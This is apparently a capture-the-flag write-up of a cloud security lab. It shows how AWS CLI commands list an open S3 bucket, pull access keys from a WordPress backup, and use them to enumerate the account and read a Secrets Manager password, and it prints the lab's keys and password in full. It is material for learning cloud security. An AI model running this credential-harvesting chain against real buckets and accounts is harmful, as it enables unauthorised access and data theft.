## Day 17

S3 is the Amazon Web Service used for data storage, but for our purposes it might as well stand for Stealing Secrets Sneakily. The benefits of the cloud - massive amounts of data available anywhere - can quickly become a security nightmare if you don't know how to properly secure it. But that's what we're here to help with.  

> Somehow, the Grinch has managed to get hold of all the Elves' names and email addresses. How could this have happened? Given the scope of the breach, McSkidy believes someone in HR must be involved. You know that HR recently launched a new portal site using WordPress. You also know that HR didn't request any infrastructure from IT to deploy this portal site. Where is that portal hosted?

We'll be using the AWS CLI tool to explore the Best Festival Company's cloud infrastructure and see what sort of information is exposed.  

>  What is the name of the S3 Bucket used to host the HR Website announcement? 

To find out what S3 bucket they're using, let's check the website assets and see what URLs they're using. Scrolling up and checking out the tree on the right in today's challenge description, we see an interesting url.  

![An image of the URL revealing the website's S3 bucket name.](tree.png)

    https://s3.amazonaws.com/images.bestfestivalcompany.com/tree.png

Therefore the bucket is "images.bestfestivalcompany.com".  

Now we can start looking at the bucket from the outside.  

    $ aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
    
    2021-11-13 10:06:51       6148 .DS_Store
    2021-11-13 07:43:03     108420 0vF39p3.png
    2021-11-27 06:55:21     705191 AWSConsole.png
    2021-11-13 07:43:03       5652 aws-logo.png
    2021-11-13 10:06:51         68 flag.txt
    2021-11-13 10:06:51    2349068 flyer.png
    2021-11-13 07:43:03      92531 presents.jpg
    2021-11-13 07:43:03       4680 tree.png
    2021-11-23 18:52:22   16556739 wp-backup.zip

We're already seeing some juicy stuff. Onto our next question:

> What is the message left in the flag.txt object from that bucket?

Let's download it:

    aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request

And then `cat` it out:

    It's easy to get your elves data when you leave it so easy to find!

> What other file in that bucket looks interesting to you?

If your eyes were drawn to wp-backup.zip, you're already a Super-A Class Hacker. We know the HR department launched a WordPress site, so if this is a backup of the site *after* it was configured, we should find some useful creds.  

    aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request

    unzip wp-backup.zip

> What is the AWS Access Key ID in that file?

The first port of call when you've got access to a WordPress directory is wp-config.php. `cat` this out and we get what we need:

    /* Add any custom values between this line and the "stop editing" line. */
    define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
    define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
    define('S3_UPLOADS_SECRET', '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');
    define('S3_UPLOADS_REGION', 'us-east-1');

> What is the AWS Account ID that access-key works for?

Now that we have some keys, let's configure a local AWS profile for them:

    $ aws configure --profile bfc 
    AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-east-1
    Default output format [None]:  

I called the profile "bfc" for Best Festival Company but you might prefer a more descriptive title.  

Now we can use the access key to look up the account ID:

    $ aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile bfc 

    {
        "Account": "019181489476"
    }

"STS" is the AWS Security Token Service and this part of the API exposes a few methods for identity and access management. You can read more about it [here](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetAccessKeyInfo.html). 

> What is the Username for that access-key?

We can run the following command and it'll look at the access key we've configured for this profile and return some more user info:

    aws sts get-caller-identity --profile bfc

We get "ElfMcHR@bfc.com".  

> There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?

In the same way that we can access STS-related methods via the STS API, we can access EC2 related methods via the EC2 API. Wow, AWS sure does make it easy for us huh?  

To list all the EC2 instances running, we can do:

    aws ec2 describe-instances --output text --profile bfc

But that gives us a whole bunch of info we don't need, so let's pare it down:

    aws ec2 describe-instances --output text --profile | grep TAGS

We get a much more manageable result:

    TAGS    aws:cloudformation:stack-id     arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7
    TAGS    aws:cloudformation:logical-id   Instance
    TAGS    created_by      Elf McHR
    TAGS    aws:cloudformation:stack-name   HR-Portal
    TAGS    Name    HR-Portal

> What is the database password stored in Secrets Manager?

Secrets Manager is yet another Amazon Web Service with [its own methods](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/index.html). First let's list the secrets out:

    aws secretsmanager list-secrets --profile bfc 

![JSON data returned by the Secrets Manager API](secrets.png)

Now that we've got the name of the secret, we can look it up. The API reference for [get-secret-value](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/get-secret-value.html) says we can give it either a friendly name or the ARN. Let's use the friendly name.  

    aws secretsmanager get-secret-value --secret-id HR-Password --profile bfc

Ah! Fooled again. We find this disappointment:

    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives."

A "region" in AWS terms is a part of the world where AWS has a bunch of data centres. Each region (e.g. us-east-1, which is what we're looking at right now and which is predictably on the US east coast) includes multiple Availability Zones, which are redundant data centres. This setup makes AWS extremely resilient. For most AWS services, you set them up in a region, and there are a bunch of implications for which region you choose and whether you want the services in one to interact with services in another.  

Looking at a map of AWS regions, it looks like the northernmost region is in Europe. There's a region called "eu-north-1" so let's try that.  

First let's list our profile details:

    aws configure list --profile bfc 

        Name                    Value             Type    Location
        ----                    -----             ----    --------
    profile                      bfc           manual    --profile
    access_key     ****************YAOI shared-credentials-file    
    secret_key     ****************1Qmc shared-credentials-file    
        region                us-east-1      config-file    ~/.aws/config

Now let's change the region for our profile:

    aws configure set region eu-north-1 --profile bfc 

If you run the `list` command again, you'll see it says "eu-north-1" instead of "us-east-1" now.  

Now let's list our secrets again:

    aws secretsmanager list-secrets --profile bfc

Aha! We see new secrets. We must be on the right track. This one is also called HR-Password but the description this time says "Employee DB Password". We can use the same command we did last time to get the secret:

    aws secretsmanager get-secret-value --secret-id HR-Password --profile bfc

This time, we see something much more valuable:

    "SecretString": "Winter2021!"

Too easy. That's why it's so important to lock down your cloud.  